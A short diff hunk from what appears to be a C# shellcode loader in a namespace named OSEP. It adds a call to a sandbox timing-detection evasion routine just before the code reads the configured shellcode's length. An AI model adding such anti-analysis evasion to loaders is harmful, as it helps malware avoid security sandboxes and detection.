@@ -24,6 +24,12 @@ namespace OSEP
 
         static void Main(string[] args)
         {
+
+            if (CONFIG.DETECT_SANDBOX_TIME)
+                Evasion.SandboxTimeDetect();
+
+
+
             int size = CONFIG.SHELLCODE.Length;
 
 
